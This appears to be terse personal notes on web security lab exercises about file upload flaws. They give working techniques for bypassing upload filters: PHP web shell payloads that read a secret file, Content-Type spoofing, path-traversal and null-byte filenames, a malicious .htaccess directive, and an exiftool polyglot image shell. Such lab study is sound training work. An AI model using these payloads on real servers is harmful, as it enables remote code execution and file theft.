<br><br>
<hr>
<br><br>
<h2>Lab: Remote code execution via web shell upload</h2>

Avatar upload


payload:
burp GET /upload

in my file:
exploit.php
<?php echo file_get_contents('/home/carlos/secret'); ?>


execute
browser: open avatar in new tab


<br><br>
<hr>
<br><br>
<h2>Lab: Web shell upload via Content-Type restriction bypass</h2>

change:
Content-Type: image/jpeg

payload jw




<br><br>
<hr>
<br><br>
<h2>Lab: Web shell upload via path traversal</h2>


original
Content-Disposition: form-data; name="avatar"; filename="exploit.ph


payload
Content-Disposition: form-data; name="avatar"; filename="../exploit.ph

Obfuscate
"..%2fexploit.php"


<br><br>
<hr>
<br><br>
<h2>Lab: Web shell upload via extension blacklist bypass</h2>


n Burp Repeater, go to the tab for the POST /my-account/avatar request and find the part of the body that relates to your PHP file. Make the following changes:

    Change the value of the filename parameter to .htaccess.
    Change the value of the Content-Type header to text/plain.

    Replace the contents of the file (your PHP payload) with the following Apache directive:
    AddType application/x-httpd-php .l33t

    This maps an arbitrary extension (.l33t) to the executable MIME type application/x-httpd-php. As the server uses the mod_php module, it knows how to handle this already.


Switch to the other Repeater tab containing the GET /files/avatars/<YOUR-IMAGE> request. In the path, replace the name of your image file with exploit.l33t and send the request. Observe that Carlos's secret was returned in the response. Thanks to our malicious .htaccess file, the .l33t file was executed as if it were a .php file. 


<br><br>
<hr>
<br><br>
<h2>Lab: Web shell upload via obfuscated file extension</h2>

%00.jpg

Content-Disposition: filename="exploit.php%00.jpg"


after upload 200,
browser: /files/avatars/exploit.php (delete null bytes)




<br><br>
<hr>
<br><br>
<h2>Lab: Remote code execution via polyglot web shell upload</h2></h2>


Payload made with real .jpg and terminal command:

exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php

This adds your PHP payload to the image's Comment field, then saves the image with a .php extension.







